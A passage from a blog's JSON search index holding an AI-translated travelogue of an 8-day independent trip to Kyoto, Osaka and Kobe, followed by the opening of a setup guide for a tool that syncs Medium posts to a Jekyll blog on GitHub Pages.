life, japan, kyoto, osaka, traveling", "date": "2023-07-07 20:13:20 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2023 8-Day Free Trip to Kyoto, Osaka, and Kobe2023/05 Kyoto, Osak...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2023 8-Day Free Trip to Kyoto, Osaka, and Kobe2023/05 Kyoto, Osaka, Kobe 8-Day Independent Travel Record and Food, Accommodation, Transportation, and Entry InformationPrefaceI have only been to two Southeast Asian countries before: Sabah, Malaysia in 2019, and Bangkok, Thailand in 2018, both on group tours.I really love the clear blue skies and the carefree indulgence in Southeast Asia.ENFPAs an enthusiastic and impulsive ENFP who acts on a whim, this trip was planned and set off within just two weeks. It started because my friend Huang Xinping happened to have a career gap and is also an INFJ, a complementary personality to ENFP. I provided the passionate direction, and he handled the detailed planning. With our collaboration, we spontaneously decided to go.KKday Promotion „ÄêSolo Travel„ÄëKyoto Amanohashidate One-Day TourÔΩúIne Bay Boat Ride„ÉªAmanohashidate„ÉªMiyama Kayabuki-no-SatoÔΩúDepart from Osaka Namba Kyoto by the Sea ‚ÄúSpirited Away‚Äù Sightseeing Train One-Day TourÔΩúTango Red Pine / Black Pine „Éª Amanohashidate View Land „Éª Sightseeing Boat „Éª Kasamatsu ParkÔΩúDeparting from Osaka „Äê1 Person Minimum„ÄëKyoto and Nara One-Day TourÔΩúArashiyama &amp; Fushimi Inari Taisha &amp; Kinkaku-ji &amp; Nara ParkÔΩúOptional Japanese Lunch Plan (Departing from Osaka, Kyoto) Universal Studios JapanÔΩúUniversal Studios Japan Tickets &amp; Express Pass Japan JR PASS | Kansai Area Rail Pass | eMCO E-ticket Japan JR PASS | Kansai Wide Area Rail Pass | eMCO E-ticket Kansai &amp; San‚Äôin Area Rail Pass JRPass Japan eSIM CardsÔΩúDaily High-Speed, Total Data, Unlimited Data Plans Preparation Before DepartureJoyBecause everything was casual, I only planned to visit Universal Studios Osaka, so I first bought tickets online; since it was too close to the date, everything was sold out except for regular admission tickets. Popular spots and theme parks in Japan really require advance purchase Orz. This time I missed out on baseball tickets; none were available at the venue, so I could only enjoy the park for a day.Other attractions, temples, and trips are flexible.You must exchange Japanese yen, as most temple entrance fees, souvenirs, amulets, and some trains (if you want to buy reserved seats) only accept cash.This time I exchanged ¬•50,000, and ended up with about ¬•15,000 left.Actionüõ´With less than a month until departure, there‚Äôs not much to choose from. I went straight to SkyScanner and found a flight that suits our laid-back pace:Taoyuan &lt;-&gt; Kansai 5/22 EVA Air BR 130 13:35 TPE -&gt; KIX 17:15 (actually delayed over 1 hour, arrived in Japan at 18:40) 5/29 EVA Air BR 177 11:10 KIX -&gt; TPE 13:05 Round trip: $14,915It seems that since last year, baggage check-in has changed to a piece and weight system: one piece per person, up to 23kg; extra items require additional fees. Since purchasing airline tickets with a credit card includes travel insurance, it is recommended to buy tickets separately for each person and verify your bank credit card‚Äôs insurance coverage, as some debit cards may not offer this benefit.You can also purchase travel insurance yourself (medical, inconvenience, loss, accidents, etc.). This time, 8 days cost about $1,500.The Flight TrackerI recommend installing The Flight Tracker App. Enter your flight details to track real-time flight information, including terminal, gate, and baggage claim details. (It also notifies you of changes, but on-site information should be prioritized.)You can enable the iOS Live Activity feature to track in real-time a few hours before the flight takes off.üì≤I bought an 8-day unlimited data SIM card directly from KKDAY online for about $700; there is also an E-SIM version, but I still prefer swapping a physical SIM card for peace of mind. You can keep the SIM card (including the SIM ejector tool) with you and switch to the Japanese SIM card on the plane after it lands safely. Remember to enable roaming after the change, then restart your device. All-you-can-eat plans in Japan may not truly be unlimited; speeds may be reduced after a certain data limit. Please check with the provider for details. It is recommended to use Wi-Fi when sending or watching videos. üöàTrains, subways, and buses all accept the Sucia EasyCard; some convenience stores and shops also accept it.iPhone can directly go to ‚ÄúWallet &amp; Apple Pay‚Äù -&gt; ‚ÄúAdd Card‚Äù -&gt; ‚ÄúTransit Card‚Äù -&gt; ‚ÄúJapan‚Äù -&gt; ‚ÄúSuica‚Äù -&gt; directly activate the virtual Suica. However, to top up, you must use a MasterCard credit card. I failed to top up with a Visa card; it is strongly recommended to complete the top-up in Taiwan first. Otherwise, if you find out in Japan that you cannot top up and do not receive the SMS verification code, it means you cannot use it at all.If you cannot use an iPhone Suica or Android; currently, physical Suica cards in Japan are out of stock. You can only buy the 28-day Welcome Suica limited-time card, which can be loaded and used, but it will expire after the period and cannot be refunded.Apple Watch also supports Suica (not shared with iPhone). Remember to set it up and top up in Taiwan first.iPhone transit cards do not require you to open the Apple Pay screen when tapping; simply take out the device, and it will automatically wake up for sensing.AccommodationMainly use Agoda to find places close to tram or subway stations.Kyoto 2 Nights: Toyoko INN Kyoto Shijo OmiyaToyoko INN is a chain hotel recommended by friends familiar with Northeast Asia. It offers great value for money and is reliable, plus it includes a Japanese-style breakfast (rice balls or curry rice).Because the booking was made too late, only four rooms are available at Toyoko INN Omiya; it is farther from Kyoto Station, about 3 kilometers away:2 people total NT$3,844Osaka 4 Nights: APA Hotel Osaka Umeda (Â§ßÈò™Ê¢ÖÁî∞)Also, because we booked too late, there were few options; we chose another APA chain hotel closer to the station but more expensive. It does not include breakfast but has facilities like a swimming pool and public bathhouse.About a 15-minute walk from Osaka Umeda Station:2 people total NT$21,459Pre-Arrival Application (Express Clearance)No special visa application or COVID vaccine/test proof is required; once your flight and hotel bookings are done, you can fill in your entry information on Visit Japan. After landing and connecting your phone to the internet, you can enter directly. Without prior application, you can only fill out a paper form on the spot.1. Registration: https://www.vjw.digital.go.jp/main/#/vjwpco001 Account Since the password rules may differ from your usual passwords, please remember it carefully or write it down to avoid forgetting it and being unable to log in when entering Japan.2. Select ‚ÄúEntry Registration, Return Schedule‚Äù3. Enter Arrival Flight InformationThe image is for illustration purposes onlyTravel Name: Custom, for personal reference only4. Input Contact Information in JapanThe image is for illustration purposes onlyI entered the hotel information for the first night‚Äôs stay and used Google to find the hotel‚Äôs address and contact number in English (it doesn‚Äôt need to be exact, just not too far off, and the hotel name must be correct).5. Landing ReservationImage for illustration only6. Select ‚ÄúReturn Entry, Re-entry Procedures‚Äù to continue filling in the information7. Select ‚ÄúForeigners‚Äô Entry Records‚Äù8. Fill in Basic InformationThe number of days for entry includes both arrival and departure, totaling 8 days.Final step to complete registration:9. Select ‚ÄúReturn Immigration and Re-entry Procedures‚Äù again and fill in ‚ÄúCustoms Declaration Preparation‚ÄùAfter filling in the basic information, keep selecting ‚ÄúNo‚Äù until the registration is complete:10. CompletedSteps upon entry: Connect to the internet and log in to the website Step 1: At immigration inspection, find ‚ÄúImmigration Inspection Preparation‚Äù and select ‚ÄúShow QR Code‚Äù Scroll down to the bottom of the webpage to find ‚ÄúShow QR Code‚Äù[2024‚Äì11‚Äì25 Update] The ‚ÄúImmigration Inspection‚Äù and ‚ÄúCustoms Declaration‚Äù QR Codes have been merged into a single ‚ÄúImmigration and Customs Declaration QR Code.‚Äù There is no distinction between blue and yellow codes. The following content is for record only and can be ignored. Show your passport and QR code to the visa officer (yellow code) Step 2: After collecting your luggage and passing through customs, click on the ‚ÄúCustoms Declaration QR Code‚Äù (blue code).At the self-service customs inspection machine, scan your passport and this QR code. Once confirmed, you can complete the customs clearance and entry process.Day 1 DepartureLog in to the airline website or email for online check-in, and directly add the boarding pass to Apple Pay for a fully digital process.A1 Taipei Main Station Pre-flight Check-inSince the flight is at noon, we left slowly in the morning and arrived at Taoyuan Airport MRT A1 Taipei Main Station at 9 AM to complete online check-in:Online Check-in = Complete check-in, baggage screening, and luggage drop-off at A1 Taipei Main Station (also available at A13 New Taipei Industrial Park); you can go straight to immigration at the airport without waiting in line at the counter.If you are coming from the MRT, remember not to go straight down the escalator into the Airport MRT. Check-in is located outside the Airport MRT.Limitations: Only certain airlines are eligible. For details, please refer to the official website Check-in and baggage drop must be completed at least 3 hours before the flight departure on the same day. Service Hours: A1 Taipei Main Station 06:00~21:30 A3 New Taipei Industrial Park Station 09:00~16:00 Traveling Light on the Airport MRT to Terminal 2Remember to first check the airport schedules on the Taoyuan Metro official website for express train times, which better control your actual arrival time at the airport; be sure to take the express train.Waiting for the planeLeft too early + checked in online, still nearly 3 hours before departure after immigration.Airport with Few People at NoonHaving Lin Dong Fang Beef Noodles while waiting for the flightThere‚Äôs even Xingbo Coffee!The delayed landing caused the departure to be delayed by over an hour as well.I‚Äôm not sure if it‚Äôs because of the online check-in, but the ground staff announced our names while waiting at the gate to confirm our presence and boarding.Bye üáπüáºAfter landing and inserting the Japanese SIM card to connect to the internet, you can log in to Vista Japan to complete immigration and customs procedures.Heading to KyotoAfter exiting Kansai Airport, we took the JR Kansai Airport Limited Express HARUKA directly to Kyoto Station. It took about 1.5 hours, with only a few stops along the way.It is recommended to buy tickets at the ticket machine to guarantee a seat.Right outside the station, you can see the iconic Kyoto Tower.Then take a taxi to the hotel (because of the luggage, we didn‚Äôt take the bus, although there is a bus available); plus the flight delay, we arrived at the hotel after 9 PM on the first day.Toyoko INN Kyoto Shijo OmiyaThe hotel front desk has a lady who speaks Chinese. I asked her about the best way to get to tomorrow‚Äôs itinerary‚Äîvery kind and helpful!The room is cool, consisting of two single rooms mirrored perfectly, connected with a shared bathroom.Hanamaru Kushikatsu Seisakusho Omiya BranchIt was late, so after dropping off our things at the hotel, we went out nearby to find something to eat and chose a fried skewer shop to go in.Plum Tea over RiceThe cheapest skewer starts at 80 yen, fresh, tasty, and affordable! An unexpected delight and favorite. When I wanted to visit again the next day, the shop was closed QQAfter eating, it‚Äôs customary to go to the convenience store LAWSON to buy a late-night snack and continue eating back at the hotel:Soy sauce fried noodles are so-so and taste quite greasy.Day 2 (Kiyomizu-dera, Kinkaku-ji, Kyoto Tower)Get up early and go downstairs to pack breakfast to eat in the room:Curry rice feels a bit too heavy after eating, so I still prefer Western or Taiwanese-style breakfast.Yasaka ShrineAfter eating, take the bus to Yasaka Shrine:Walk all the way to Kiyomizu-dera TempleThe streets of Kyoto are eerily clean, with even the concrete blocks by the roadside free from any dirt or grime.Walking from Yasaka Shrine to Kiyomizu Temple is about 1‚Äì2 kilometers, but just enjoy the street scenery along the way!Yasaka PagodaStopped by a shop for iced matcha and brown sugar dumplings:There is also delicious sake ice cream:Kiyomizu-dera TempleArrivalThe sun is strong, and there are many people.Otowa WaterfallQueue up to pray for academic success, love, and long-lasting health.After finishing the visit, I walked back down to Yasaka Shrine, grabbed a quick rice bowl, and followed the trend by buying a cup of % coffee.In the afternoon, take the bus to ‚ÄúKaohsiung‚Äù‚Ä¶. (Just kidding, it‚Äôs Kinkaku-ji)After getting off, it takes about a 15-minute walk to reach Kinkaku-ji:Kinkaku-jiThe bus stop for the return trip was crowded with many people. Those who are willing to walk can, like us, go to the next intersection to catch another bus route to avoid the crowd and head to Kyoto Tower.Kyoto TowerAround 5:30 PM, arrive at Kyoto Tower Observation Deck:You can birdwatch the vast, unreachable Kyoto from above, with a bar downstairs; we originally planned to go down to rest first and come back up at night to see the night view, but when we finished eating and wanted to go back up, we found out re-entry was not allowed and we had to buy a new ticket, so we gave up.Add a photo of the Kyoto Tower night view taken outdoors. (The weather was really nice)Cute AccessoriesJust go to the convenience store to buy some instant noodles for a late-night snack and eat them back at the hotel.Day 3 (Arashiyama, Osaka)On the second day, we skipped the hotel breakfast. After a good sleep, we checked out, left our luggage at the hotel, and headed out to Arashiyama.Eating McDonald‚Äôs Breakfast (15 TWD Cheaper than in Taiwan)After eating, go straight across to catch the bus to Arashiyama.Shijo-Omiya is the starting station, and you can take the train directly to the last stop, Arashiyama. It‚Äôs very convenient and you will definitely get a seat.ArashiyamaArrival:Then head towards the Arashiyama direction:You can experience a boat ride to enjoy the river view (similar to Xiao Bitan?).If you have good stamina, you can choose a short hike:We went hiking to see monkeys and enjoy the panoramic view. It takes about 30‚Äì45 minutes to go from the bottom to the top of the mountain, and it‚Äôs not difficult.There really is a monkeyAfter descending the mountain and heading back, I ate tempura soba for lunch along the way:Clicked the wrong one; it shouldn‚Äôt be the rice with holes, as it will turn into soba noodles + tempura rice with holes.After eating, head in another direction to ‚ÄúDaihon-zan Tenryu-ji‚Äù:Tenryu-ji TempleExit from the back gate of Tenryu-ji Temple and go straight to the bamboo grove:There are really many people, so you need to find a good angle for photos ü•µShooting from bottom to top is also very beautiful.Going down the mountain to eat ice cream, ready to head back home.Bought some local sake on the wayReturn to Omiya Station to pick up your luggage at the hotel and prepare to head to Osaka:The hotel is right outside Hankyu Omiya StationOn the first day, I felt it was a bit inconvenient because it was far from Kyoto Station; but later I realized it was actually great. It is centrally located between Kinkaku-ji and Kiyomizu-dera, with a direct train to Arashiyama right outside. To go to Osaka, you can also just take the train directly from there (about an hour‚Äôs ride).Arriving in Osaka for the first time, it‚Äôs easy to get lost because there are many exits. Osaka and Umeda actually refer to the same area.Arrival at APA HotelHuang XinpingThe hotel rooftop features a free outdoor swimming pool, there is a convenience store inside the hotel, and public hot spring baths are available for free.After dropping off our luggage, we went out to find something to eat:Tengu Sakaba Sonezaki Ohatsu Tenjin Street Branch, five skewers of grilled chicken for 385 yen‚Ä¶ cheaper than in Taiwan!Wandering around near the station after eatingThe playground has a polar bear that mocks itself!!Day 4 Osaka Castle, Tsuruhashi, NintendoAccording to Google Maps directions, take the train and then walk to Osaka Castle. The walking part from the station to the moat and then to the main castle takes about 30 minutes, which is quite a distance. The line at the ticket counter is very long. You can buy tickets online to skip the queue and enter directly.Osaka CastleView from the summit overlooking Osaka:Each layer contains an introduction to the history of the Warring States period:After leaving Osaka Castle, I took a long walk around the nearby area to explore and find something to eat.Then head to suburban Tsuruhashi to find some small shops for shopping.TsuruhashiAfter walking around Tsuruhashi for a long time, this area seems to be a non-touristy zone with few visitors; there are many Korean-themed shops, more like a Korean town for Japanese people.Just came to Xiaodian to buy Korean cultural products, but later found out they are also sold in Taiwan - _ -NintendoAfter walking all around Osaka, my feet were about to give out; fortunately, on the way back to Osaka Umeda Station, I stopped by Nintendo for a visit.Nintendo Osaka is located upstairs in the Daimaru Department Store right next to the station.Go crazy and buy tons of Zelda merchandise:Everything feels high-quality; the badge is metal and finely crafted.Day 5 Universal Studios KKday Universal Studios Japan | Universal Express PassWe didn‚Äôt buy Express Passes or Super Mario World tickets, nor did we wake up early to line up; we took a laid-back, casual approach and entered the park after 10 a.m.The park was very crowded. Upon entering, I quickly used the app to try my luck at winning a Super Mario World ticket. Fortunately, thanks to the expert Huang Xinping, I won the 5 PM entry slot for Mario World.First, take a stroll around the Harry Potter-themed area:ButterbeerQueued up to buy Butterbeer (non-alcoholic, very sweet). I think if you really want to collect it, you should buy the most expensive glass one.Next Stop: Jurassic Park:Waited about 45 minutes for the ride; sat in the front row.Similar to a volcano adventure, it ends with a drop ü•µ (I‚Äôm very afraid of the weightless feeling).But luckily I got to visit. Later, I saw in the news that this facility will undergo renovation starting in June and will be closed for a few years.After playing until nearly noon, we started wandering around and looking for foodThe scenery inside is very realistic; you would think you‚Äôre in the üá∫üá∏.NO LIMIT! Parade! ParadeYoshi!!The unexpected joy and fun in the beginning still lingers in my mind with that melody today!There will be floats featuring characters like Mario, Pok√©mon, and Sesame Street, along with dancers leading the crowd. At each stop, they will pause to get everyone moving together! All staff, including those maintaining order, will join in the dancing, creating a strong sense of involvement!Super Mario WorldWandering around, I headed to Super Mario World at around five o‚Äôclock.I have to praise this scene design; it completely brings the game world into reality, like stepping into a paradise!Since it was close to closing time, I didn‚Äôt buy the watch to play the interactive scenes and only queued for Yoshi‚Äôs attraction.Every detail is crafted with great precision!FarewellBefore closing, I took some night shots of Universal. Many places that were usually crowded became much easier to photograph.Especially in the Harry Potter themed area, the wand interaction scenes usually have long lines, but before closing time, there was no one. I saw a girl enjoying every interaction scene all by herself XDFinally, took a last shot of the Earth, goodbye Global.Had dinner at an izakaya and bought Nissin instant noodles for a late-night snack (after trying many, this one still tastes the best).Day 6 Kobe, DotonboriGot up early and took the train to Kobe.First, visit the Kobe shopping street.Taste the famous Kobe beef croquetteWalk from the shopping street all the way to Kobe PortJust realized the Kobe Tower is under maintenance QQThe exact completion time is uncertain.On the way back, stroll through the streets of KobeStopped by a caf√© in Kobe to take a break:Strawberry chocolate milkshake smoothie, tasty but very sweet.DotonboriFrom Kobe to the Dotonbori areaFor dinner, we went to the famous Osaka Shinsekai Kushikatsu Ittoku.After eating, start the tourist itinerary: take photos at scenic spots and visit drugstores to shop.GlicoBack in Taiwan I realized I took the photo wrong only after checking IG XD. Entering from the side of the department store offers a better photo spot.Return to the hotel to continue eating instant noodles and drinking sake as a late-night snack.No memory of the taste KKday Osaka Must-Visit Attractions PassÔΩúOsaka e-PASSDay 7 Koshien, Namba, Drugstores, Shopping SpreeLast day before returning to Taiwan, just a quick sightseeing trip.Koshien, Check-in FailedEarly in the morning, I suddenly decided to go to Koshien to watch the Hanshin Tigers baseball game and took the subway to Koshien Station.Exit leads directly to Koshien Baseball Stadium.But we were turned away; unlike baseball games in Taiwan where seats are always available, Hanshin games are sold out through July. You have to buy tickets early, or else you‚Äôll end up just hanging around outside the stadium all day.Finally, we grabbed a bite nearby, bought some Hanshin Tigers merchandise, had a coffee at Cote d‚ÄôAzur, and then left.I always thought it was called ‚ÄúCoffee Place.‚ÄùHanshin Tigers StickersNambaAfter leaving Koshien, head to Namba for shopping and strolling.Also, grab some takoyaki and crab legs from the street vendors.Might have gone to the wrong store, felt very ordinary.Walked back to the Dotonbori area, then continued to the Don Quijote main store.The only store with a Ferris wheelAfter sightseeing, return to Osaka in the evening and find an izakaya near your accommodation for the last dinner.One last look at the night view of Osaka.Day 8 Return TripThe flight is at noon, so I checked out at 7 AM to head to Kansai Airport.Starting today, the weather in Osaka has changed, becoming cloudy and rainy, fitting the mood of farewell perfectly.Finally, took a photo of the Osaka building view as a farewell. I originally planned to take the train to Kansai Airport, but I didn‚Äôt want to carry my luggage up and down. The day before, I specifically checked the bus routes (including times and stops). Early in the morning, I went to the bus station to see if there were many people. Fortunately, the line was short, so we bought bus tickets to Kansai Airport and comfortably took the bus directly there.You can also enjoy the final view of Osaka along the way.Just arrived at the airport and was shocked by the long queue at the check-in counter.Finally, we found the correct check-in counter. We completed the online check-in and can go straight to the baggage drop-off counter! This saved us nearly an hour. Actually, I want to tell the people in line that if you open the webpage and click to get your e-ticket, you can go check in your luggage and then proceed to exit.After passing through immigration, Kansai Airport was under renovation, with few food options and shops available. In the end, I bought a pork cutlet curry toast from Shinsekai.Waiting at the airport, heading back to Taiwan.Arrived safely in Taiwan in the afternoon, heading home to rest! üáπüáºLootActually, I didn‚Äôt buy much, just whatever caught my eye. After comparing, I found that the drugstores near Kyoto Station were the cheapest (about 100-300 yen cheaper than in Osaka), with Don Quijote being the most expensive.Yodobashi‚Äôs theme song is really catchy; after shopping in Kyoto, I was immediately hooked.Japan‚Äôs tax-free policy requires a minimum purchase of ¬•5,000 with a passport to qualify for tax exemption. Items will be sealed in a plastic bag, which must only be opened after returning home (the above photo was taken at home). Opening the bag inside Japan could lead to tax charges if caught at the border, though inspections seem rare. For compliance, remember that liquids must be checked in; if the sealed bag contains liquids, the entire bag must be checked in.For food, besides the famous snacks, I mostly look for century-old local shops. I can‚Äôt guarantee they taste great, but I guarantee they‚Äôre a hundred years old. The snacks everyone recommends are definitely delicious, but you have to queue up and they‚Äôre not century-old XD.In the end, it‚Äôs still best to find good food!EpilogueFell in love with Japan on my first visit and started planning the next trip as soon as I got back. Actually, I went to Tokyo again from 6/7 to 6/11 üòù Travelogue part two coming soonOverall, the transportation is convenient, the environment is quiet, and the climate is pleasant (visiting in May feels like autumn in Taiwan, with cool evenings). People respect personal boundaries and are polite; I really like it!Given the current value of the Japanese yen and prices, consumption is actually cheaper than in Taiwan‚Ä¶Accommodation and Transportation: Trains and buses have wider coverage and are more convenient than in Taiwan; during the entire trip, I only took a taxi to the hotel on the first day. Although transportation is convenient, Japan is large, and most of the time you need to be active on foot, walking nearly 20,000 steps daily. Standing on the left or right is not fixed; in Kyoto, stand on the left, but in Osaka, stand on the right. Buses wait for passengers to be seated before starting and wait for you to stand up and get off slowly; therefore, there is no need to move around before the stop. Japanese people also dislike this behavior. Hotel bathrooms are very clean and comfortable; even the smallest rooms have bathtubs. Toilets are almost all bidet-style. In department stores, there is even background water sound to prevent awkwardness. 5/23‚Äì5/28 Step Count PeakCulture: The cityscape is clean and highly uniform (e.g., all entrances look the same; there are no cases where some households have shoe cabinets while others do not‚Äîeither all have them or none do). No one eats while walking; everyone finishes eating in front of the shop before leaving. Trash can only be taken back to the hotel, as there are very few trash bins on the street. Therefore, it‚Äôs most convenient to return the trash to the store after eating at the entrance. The store only accepts its own trash. english is basically incomprehensible, so communication relies on simple phrases, gestures, or translation apps; however, drugstores and large shopping malls usually have Chinese-speaking staff. Buying tickets, receipts, giving change, and handing money should be done by directly placing or taking from the tray without touching the staff. Avoid physical contact and staying too close. Public transportation is generally very quiet, especially buses. When taking photos or videos, avoid capturing people‚Äôs faces. If uploading to social media, blur any faces. When photographing temples, shoot at an angle, not straight on. Focus on detailed SOPs; also, it seems difficult to integrate into Japan. Japanese people generally dress formally or at least stylishly, and women are usually very well-groomed. Also, don‚Äôt criticize others. At Universal Studios, we encountered a group from Taiwan (he had a üáπüáº sticker on his bag) who seemed to be on a company trip for a multi-level marketing company. They were loudly shouting slogans and filming, saying things like ‚ÄúShout super awesome, sales going up.‚Äù Because the place was crowded and they stood in the middle of the path, a group shouting slogans and repeatedly filming and shouting was really embarrassing.Returning to Work and ‚ÄúProduct‚ÄùMy personal feeling is that if you want to enter the Japanese market, relying solely on advertising and marketing will be very difficult. At best, you might reach some people who want to try something new. Japan has a strong cultural unity, so you need to find a way to integrate into their lifestyle and habits to have a chance to win their hearts.Another issue is the low fault tolerance, such as bugs or unexpected appearances of other languages; for us, one or two times might be acceptable or at least not frequent; for them, even one occurrence could cause a shutdown because this system is not rigorous enough or does not take them seriously.‚Äî ‚Äî ‚Äîüëë Finally, the most reliable travel companion ÈªÉÈ¶®Âπ≥Successful Kansai Trip!KKday Promotion „ÄêSolo Travel„ÄëKyoto Amanohashidate One-Day TourÔΩúIne Bay Boat Ride„ÉªAmanohashidate„ÉªMiyama Kayabuki-no-SatoÔΩúDepart from Osaka Namba Sea Kyoto ‚ÄúSpirited Away‚Äù Sightseeing Train One-Day TourÔΩúTango Red Pine / Black Pine „Éª Amanohashidate View Land „Éª Sightseeing Boat „Éª Kasamatsu ParkÔΩúDeparting from Osaka „Äê1 Person Departure„ÄëKyoto Nara One-Day TourÔΩúArashiyama &amp; Fushimi Inari Taisha &amp; Kinkakuji &amp; Nara ParkÔΩúOptional Japanese Lunch Plan (Departing from Osaka, Kyoto) Universal Studios JapanÔΩúUniversal Studios Japan Tickets &amp; Express Pass Japan JR PASS | Kansai Area Rail Pass | eMCO E-Ticket Japan JR PASS | Kansai Wide Area Rail Pass | eMCO E-ticket Kansai &amp; Sanin Area Railway Pass JRPass Japan eSIM CardÔΩúDaily High-Speed, Total Data, Unlimited Data Plans If this article is helpful to you, please consider using my referral link to purchase KKday products and tours. I will receive a portion of the revenue to continue creating more travel content. Thank you.If you have any questions or feedback, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "ZMediumToJekyllÔΩúSeamlessly Migrate and Sync Medium Posts to Jekyll Blogs", "url": "/posts/zrealm-dev/zmediumtojekyll-seamlessly-migrate-and-sync-medium-posts-to-jekyll-blogs-e7c547a5be22/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, medium, post, medium-backup, ios-app-development, markdown", "date": "2023-03-18 02:47:07 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!ZMediumToJekyllMove your Medium posts to a Jekyll blog and keep them in sync i...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!ZMediumToJekyllMove your Medium posts to a Jekyll blog and keep them in sync in the future.This tool can help you transfer your Medium posts to a Jekyll blog and keep them synchronized in the future.It will automatically download your posts from Medium, convert them to Markdown, and upload them to your repository. Check out my blog for an online demo zhgchg.li.One-time setting, Lifetime enjoying‚ù§Ô∏èPowered by ZMediumToMarkdown .If you only want to create a backup or auto-sync of your Medium posts, you can use the GitHub Action directly by following the instructions in this Wiki .Setup You can follow each step of this process by watching the following video tutorial Click the green button Use this template above and select Create a new repository. Repo Owner can be an organization or username. Enter the Repository Name, usually your GitHub Username/Organization Name followed by .github.io. For example, if my organization name is zhgchgli, it will be zhgchgli.github.io. Choose the public repository option, then click Create repository from template. Allow access to GitHub Actions by going to the Settings tab in your GitHub repository, selecting Actions -&gt; General, locating the Workflow permissions section, selecting Read and write permissions, and clicking Save to apply the changes. *If you choose a different Repository Name, the GitHub page will be https://username.github.io/Repository Name instead of https://username.github.io/, and you will need to fill in the baseurl field in _config.yml with your Repository Name.*If you are using an organization and cannot enable Read and Write permissions in the repository settings, please refer to the organization settings page and enable it there.First-time run Please refer to the configuration information in the section below and make sure to specify your Medium username in the _zmediumtomarkdown.yml file. ‚åõÔ∏è Please wait for the Automatic Build and pages-build-deployment GitHub actions to finish before making any further changes. Then, you can manually run the ZMediumToMarkdown GitHub action by going to the Actions tab in your GitHub repository, selecting the ZMediumToMarkdown action, clicking on the Run workflow button, and selecting the main branch. ‚åõÔ∏è Please wait for the action to download and convert all Medium posts from the specified username, and commit the posts to your repository. ‚åõÔ∏è Please wait for the Automatic Build and pages-build-deployment actions to finish before making any further changes. They will start automatically once the ZMediumToMarkdown action has completed. Go to the Settings section of your GitHub repository and select Pages. In the Branch field, select gh-pages, and leave /(root) selected as the default. Click Save. You can also find the URL for your GitHub page at the top of the page. ‚åõÔ∏è Please wait for the Pages build and deployment action to finish. üéâ After completing all actions, you can visit your xxx.github.io page to verify the results. Congratulations! üéâ *To avoid expected Git conflicts or unexpected errors, please follow the steps carefully and in order, and be patient while waiting for each action to complete.*Note that the first run may take longer.*If you open the URL and notice that something is wrong, such as missing web styles, please make sure your configuration in the _config.yml file is correct.*Please refer to the ‚ÄòThings to Know‚Äô and ‚ÄòTroubleshooting‚Äô sections below for more information.ConfigurationSite Setting_zmediumtomarkdown.ymlmedium_username: # enter your username on Medium.comPlease specify your Medium username for automatic downloading and syncing of your posts._config.yml &amp; jekyll settingFor more information, please refer to jekyll-theme-chirpy or jekyllrb .Github ActionZMediumToMarkdownYou can configure the time interval for syncing in ./.github/workflows/ZMediumToMarkdown.yml.The default time interval for syncing is once per day.You can also manually run the ZMediumToMarkdown action by going to the Actions tab in your GitHub repository, selecting the ZMediumToMarkdown action, clicking the Run workflow button, and choosing the main branch.DisclaimerAll content downloaded using ZMediumToMarkdown, including but not limited to articles, images, and videos, are subject to copyright laws and belong to their respective owners. ZMediumToMarkdown does not claim ownership of any content downloaded using this tool.Downloading and using copyrighted content without the owner‚Äôs permission may be illegal and could lead to legal consequences. ZMediumToMarkdown does not endorse or support copyright infringement and is not responsible for any misuse of this tool.Users of ZMediumToMarkdown are solely responsible for ensuring they have the necessary permissions and rights to download and use any content obtained with this tool. ZMediumToMarkdown is not liable for any legal issues resulting from misuse of this tool.By using ZMediumToMarkdown, users acknowledge and agree to comply with all applicable copyright laws and regulations.TroubleshootingMy GitHub page keeps presenting a 404 error or doesn‚Äôt update with the latest posts. Please make sure you have followed the setup steps above in order. Wait for all GitHub actions to finish, including the Pages build and deployment and Automatic Build actions. You can check the progress on the Actions 